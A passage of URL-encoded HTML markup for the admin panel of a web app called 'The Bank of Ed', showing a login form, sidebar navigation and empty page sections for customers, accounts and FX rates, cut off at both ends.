D%5Cn%20%20%20%20%20%20%20%20%20%20%7D%2C%5Cn%20%20%20%20%20%20%20%20%20%20fontFamily%3A%20%7B%20sans%3A%20%5B'Inter'%2C%20'system-ui'%2C%20'sans-serif'%5D%20%7D%5Cn%20%20%20%20%20%20%20%20%7D%5Cn%20%20%20%20%20%20%7D%5Cn%20%20%20%20%7D%5Cn%20%20%3C%2Fscript%3E%5Cn%20%20%3Clink%20rel%3D%5C%22stylesheet%5C%22%20href%3D%5C%22css%2Fapp.css%5C%22%3E%5Cn%3C%2Fhead%3E%5Cn%3Cbody%20class%3D%5C%22bg-dark-50%20font-sans%20text-dark-800%5C%22%3E%5Cn%5Cn%20%20%3C!--%20Toast%20Container%20--%3E%5Cn%20%20%3Cdiv%20id%3D%5C%22toast-container%5C%22%20class%3D%5C%22fixed%20top-4%20right-4%20z-50%20space-y-2%5C%22%3E%3C%2Fdiv%3E%5Cn%5Cn%20%20%3C!--%20Modal%20Overlay%20--%3E%5Cn%20%20%3Cdiv%20id%3D%5C%22modal-overlay%5C%22%20class%3D%5C%22hidden%20fixed%20inset-0%20z-40%20bg-black%2F50%20backdrop-blur-sm%20flex%20items-center%20justify-center%20p-4%5C%22%3E%5Cn%20%20%20%20%3Cdiv%20id%3D%5C%22modal-content%5C%22%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-2xl%20w-full%20max-w-md%20max-h-%5B90vh%5D%20overflow-y-auto%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%3C!--%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20AUTH%20VIEW%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20--%3E%5Cn%20%20%3Cdiv%20id%3D%5C%22view-auth%5C%22%20class%3D%5C%22hidden%20min-h-screen%20flex%20items-center%20justify-center%20bg-gradient-to-br%20from-dark-900%20via-dark-800%20to-dark-950%20p-4%5C%22%3E%5Cn%20%20%20%20%3Cdiv%20class%3D%5C%22w-full%20max-w-md%5C%22%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22text-center%20mb-8%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22inline-flex%20items-center%20gap-3%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-12%20h-12%20bg-red-600%20rounded-xl%20flex%20items-center%20justify-center%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-7%20h-7%20text-white%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M10.325%204.317c.426-1.756%202.924-1.756%203.35%200a1.724%201.724%200%20002.573%201.066c1.543-.94%203.31.826%202.37%202.37a1.724%201.724%200%20001.066%202.573c1.756.426%201.756%202.924%200%203.35a1.724%201.724%200%2000-1.066%202.573c.94%201.543-.826%203.31-2.37%202.37a1.724%201.724%200%2000-2.573%201.066c-.426%201.756-2.924%201.756-3.35%200a1.724%201.724%200%2000-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724%201.724%200%2000-1.066-2.573c-1.756-.426-1.756-2.924%200-3.35a1.724%201.724%200%20001.066-2.573c-.94-1.543.826-3.31%202.37-2.37.996.608%202.296.07%202.572-1.065z%5C%22%3E%3C%2Fpath%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M15%2012a3%203%200%2011-6%200%203%203%200%20016%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-3xl%20font-bold%20text-white%5C%22%3EThe%20Bank%20of%20Ed%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-400%20mt-2%5C%22%3EAdministration%20Panel%3C%2Fp%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-2xl%20overflow-hidden%20p-8%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cform%20id%3D%5C%22login-form%5C%22%20onsubmit%3D%5C%22BankOfEdAdmin.AuthPage.handleLogin(event)%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22space-y-5%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%20class%3D%5C%22block%20text-sm%20font-medium%20text-dark-700%20mb-1.5%5C%22%3EUsername%3C%2Flabel%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22text%5C%22%20name%3D%5C%22username%5C%22%20required%20class%3D%5C%22w-full%20px-4%20py-3%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%5C%22%20placeholder%3D%5C%22admin%5C%22%20autofocus%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%20class%3D%5C%22block%20text-sm%20font-medium%20text-dark-700%20mb-1.5%5C%22%3EPassword%3C%2Flabel%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22password%5C%22%20name%3D%5C%22password%5C%22%20required%20class%3D%5C%22w-full%20px-4%20py-3%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%5C%22%20placeholder%3D%5C%22Enter%20password%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22login-errors%5C%22%20class%3D%5C%22mt-4%20text-sm%20text-red-600%20hidden%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type%3D%5C%22submit%5C%22%20class%3D%5C%22w-full%20mt-6%20bg-red-600%20hover%3Abg-red-700%20text-white%20font-semibold%20py-3%20rounded-xl%20transition-colors%20flex%20items-center%20justify-center%20gap-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%3ESign%20In%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%20animate-spin%20hidden%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Ccircle%20class%3D%5C%22opacity-25%5C%22%20cx%3D%5C%2212%5C%22%20cy%3D%5C%2212%5C%22%20r%3D%5C%2210%5C%22%20stroke%3D%5C%22currentColor%5C%22%20stroke-width%3D%5C%224%5C%22%20fill%3D%5C%22none%5C%22%3E%3C%2Fcircle%3E%3Cpath%20class%3D%5C%22opacity-75%5C%22%20fill%3D%5C%22currentColor%5C%22%20d%3D%5C%22M4%2012a8%208%200%20018-8V0C5.373%200%200%205.373%200%2012h4z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fform%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%3C!--%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20APP%20SHELL%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20--%3E%5Cn%20%20%3Cdiv%20id%3D%5C%22app-shell%5C%22%20class%3D%5C%22hidden%20flex%20h-screen%20overflow-hidden%5C%22%3E%5Cn%5Cn%20%20%20%20%3C!--%20Mobile%20Header%20--%3E%5Cn%20%20%20%20%3Cdiv%20class%3D%5C%22lg%3Ahidden%20fixed%20top-0%20left-0%20right-0%20z-30%20bg-dark-900%20text-white%20flex%20items-center%20justify-between%20px-4%20py-3%5C%22%3E%5Cn%20%20%20%20%20%20%3Cbutton%20onclick%3D%5C%22BankOfEdAdmin.App.toggleSidebar()%5C%22%20class%3D%5C%22p-2%20hover%3Abg-dark-800%20rounded-lg%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-6%20h-6%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M4%206h16M4%2012h16M4%2018h16%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-8%20h-8%20bg-red-600%20rounded-lg%20flex%20items-center%20justify-center%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%20text-white%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M10.325%204.317c.426-1.756%202.924-1.756%203.35%200a1.724%201.724%200%20002.573%201.066c1.543-.94%203.31.826%202.37%202.37a1.724%201.724%200%20001.066%202.573c1.756.426%201.756%202.924%200%203.35a1.724%201.724%200%2000-1.066%202.573c.94%201.543-.826%203.31-2.37%202.37a1.724%201.724%200%2000-2.573%201.066c-.426%201.756-2.924%201.756-3.35%200a1.724%201.724%200%2000-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724%201.724%200%2000-1.066-2.573c-1.756-.426-1.756-2.924%200-3.35a1.724%201.724%200%20001.066-2.573c-.94-1.543.826-3.31%202.37-2.37.996.608%202.296.07%202.572-1.065z%5C%22%3E%3C%2Fpath%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M15%2012a3%203%200%2011-6%200%203%203%200%20016%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cspan%20class%3D%5C%22font-semibold%5C%22%3EAdmin%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-10%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%3C!--%20Sidebar%20Overlay%20(mobile)%20--%3E%5Cn%20%20%20%20%3Cdiv%20id%3D%5C%22sidebar-overlay%5C%22%20onclick%3D%5C%22BankOfEdAdmin.App.toggleSidebar()%5C%22%20class%3D%5C%22hidden%20fixed%20inset-0%20z-30%20bg-black%2F50%20lg%3Ahidden%5C%22%3E%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%3C!--%20Sidebar%20--%3E%5Cn%20%20%20%20%3Caside%20id%3D%5C%22sidebar%5C%22%20class%3D%5C%22fixed%20lg%3Astatic%20inset-y-0%20left-0%20z-40%20w-64%20bg-dark-900%20text-white%20flex%20flex-col%20transform%20-translate-x-full%20lg%3Atranslate-x-0%20transition-transform%20duration-200%5C%22%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22p-6%20flex%20items-center%20gap-3%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-10%20h-10%20bg-red-600%20rounded-xl%20flex%20items-center%20justify-center%20flex-shrink-0%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-6%20h-6%20text-white%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M10.325%204.317c.426-1.756%202.924-1.756%203.35%200a1.724%201.724%200%20002.573%201.066c1.543-.94%203.31.826%202.37%202.37a1.724%201.724%200%20001.066%202.573c1.756.426%201.756%202.924%200%203.35a1.724%201.724%200%2000-1.066%202.573c.94%201.543-.826%203.31-2.37%202.37a1.724%201.724%200%2000-2.573%201.066c-.426%201.756-2.924%201.756-3.35%200a1.724%201.724%200%2000-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724%201.724%200%2000-1.066-2.573c-1.756-.426-1.756-2.924%200-3.35a1.724%201.724%200%20001.066-2.573c-.94-1.543.826-3.31%202.37-2.37.996.608%202.296.07%202.572-1.065z%5C%22%3E%3C%2Fpath%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M15%2012a3%203%200%2011-6%200%203%203%200%20016%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Ch2%20class%3D%5C%22font-bold%20text-lg%5C%22%3EThe%20Bank%20of%20Ed%3C%2Fh2%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-xs%20text-dark-400%5C%22%3EAdmin%20Panel%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%20%20%3Cnav%20class%3D%5C%22flex-1%20px-3%20space-y-1%20mt-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Fcustomers%5C%22%20data-nav%3D%5C%22customers%5C%22%20class%3D%5C%22nav-link%20flex%20items-center%20gap-3%20px-4%20py-3%20rounded-xl%20text-dark-300%20hover%3Atext-white%20hover%3Abg-dark-800%20transition-colors%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M17%2020h5v-2a3%203%200%2000-5.356-1.857M17%2020H7m10%200v-2c0-.656-.126-1.283-.356-1.857M7%2020H2v-2a3%203%200%20015.356-1.857M7%2020v-2c0-.656.126-1.283.356-1.857m0%200a5.002%205.002%200%20019.288%200M15%207a3%203%200%2011-6%200%203%203%200%20016%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3ECustomers%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Faccounts%5C%22%20data-nav%3D%5C%22accounts%5C%22%20class%3D%5C%22nav-link%20flex%20items-center%20gap-3%20px-4%20py-3%20rounded-xl%20text-dark-300%20hover%3Atext-white%20hover%3Abg-dark-800%20transition-colors%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M3%2010h18M7%2015h1m4%200h1m-7%204h12a3%203%200%20003-3V8a3%203%200%2000-3-3H6a3%203%200%2000-3%203v8a3%203%200%20003%203z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3EAccounts%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Ffx-rates%5C%22%20data-nav%3D%5C%22fx-rates%5C%22%20class%3D%5C%22nav-link%20flex%20items-center%20gap-3%20px-4%20py-3%20rounded-xl%20text-dark-300%20hover%3Atext-white%20hover%3Abg-dark-800%20transition-colors%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M12%208c-1.657%200-3%20.895-3%202s1.343%202%203%202%203%20.895%203%202-1.343%202-3%202m0-8c1.11%200%202.08.402%202.599%201M12%208V7m0%201v8m0%200v1m0-1c-1.11%200-2.08-.402-2.599-1M21%2012a9%209%200%2011-18%200%209%209%200%200118%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3EFX%20Rates%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Fsystem%5C%22%20data-nav%3D%5C%22system%5C%22%20class%3D%5C%22nav-link%20flex%20items-center%20gap-3%20px-4%20py-3%20rounded-xl%20text-dark-300%20hover%3Atext-white%20hover%3Abg-dark-800%20transition-colors%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M4%204v5h.582m15.356%202A8.001%208.001%200%20004.582%209m0%200H9m11%2011v-5h-.581m0%200a8.003%208.003%200%2001-15.357-2m15.357%202H15%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3ESystem%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%3C%2Fnav%3E%5Cn%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22p-4%20border-t%20border-dark-800%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-3%20mb-3%20px-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-9%20h-9%20bg-dark-700%20rounded-full%20flex%20items-center%20justify-center%20text-sm%20font-semibold%5C%22%20id%3D%5C%22sidebar-avatar%5C%22%3EA%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22min-w-0%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-sm%20font-medium%20truncate%5C%22%20id%3D%5C%22sidebar-admin-name%5C%22%3EAdmin%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cbutton%20onclick%3D%5C%22BankOfEdAdmin.App.logout()%5C%22%20class%3D%5C%22w-full%20flex%20items-center%20gap-3%20px-4%20py-2.5%20rounded-xl%20text-dark-400%20hover%3Atext-red-400%20hover%3Abg-dark-800%20transition-colors%20text-sm%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M17%2016l4-4m0%200l-4-4m4%204H7m6%204v1a3%203%200%2001-3%203H6a3%203%200%2001-3-3V7a3%203%200%20013-3h4a3%203%200%20013%203v1%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3ESign%20Out%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Faside%3E%5Cn%5Cn%20%20%20%20%3C!--%20Main%20Content%20--%3E%5Cn%20%20%20%20%3Cmain%20class%3D%5C%22flex-1%20overflow-y-auto%20pt-14%20lg%3Apt-0%5C%22%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22p-4%20sm%3Ap-6%20lg%3Ap-8%20max-w-7xl%20mx-auto%5C%22%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20Customers%20List%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-customers%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20justify-between%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-2xl%20font-bold%20text-dark-900%5C%22%3ECustomers%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-500%20mt-1%5C%22%3EManage%20customer%20accounts%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-3%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22text%5C%22%20id%3D%5C%22customer-search%5C%22%20placeholder%3D%5C%22Search...%5C%22%20class%3D%5C%22px-4%20py-2.5%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%20text-sm%20w-48%5C%22%20onkeyup%3D%5C%22BankOfEdAdmin.CustomersPage.handleSearch(event)%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22customers-table%5C%22%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-dark-100%20overflow-hidden%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22customers-pagination%5C%22%20class%3D%5C%22mt-4%20flex%20items-center%20justify-between%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20Customer%20Detail%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-customer-detail%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Fcustomers%5C%22%20class%3D%5C%22inline-flex%20items-center%20gap-1%20text-red-600%20hover%3Atext-red-700%20text-sm%20font-medium%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M15%2019l-7-7%207-7%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20Back%20to%20Customers%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22customer-detail-content%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20Accounts%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-accounts%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-2xl%20font-bold%20text-dark-900%5C%22%3EAll%20Accounts%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-500%20mt-1%5C%22%3EView%20and%20manage%20all%20bank%20accounts%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22accounts-table%5C%22%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-sm%20border%20border-dark-100%20overflow-hidden%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22accounts-pagination%5C%22%20class%3D%5C%22mt-4%20flex%20items-center%20justify-between%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsection%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20FX%20Rates%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-fx-rates%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20justify-between%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-2xl%20font-bold%20text-dark-900%5C%22%3EFX%20Rates%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-500%20mt-1%5C%22%3EManage%20foreign%20exchange%20rates%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20onclick%3D%5C%22BankOfEdAdmin.FxRatesPage.showAddModal()%5C%22%20class%3D%5C%22bg-red-600%20hover%3Abg-red-700%20text-white%20font-semibold%20px-5%20py-2.5%20rounded-xl%20transition-colors%20text-sm%20flex%20items-center%20gap-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M12%204v16m8-8H4%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20Add%20Rate%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%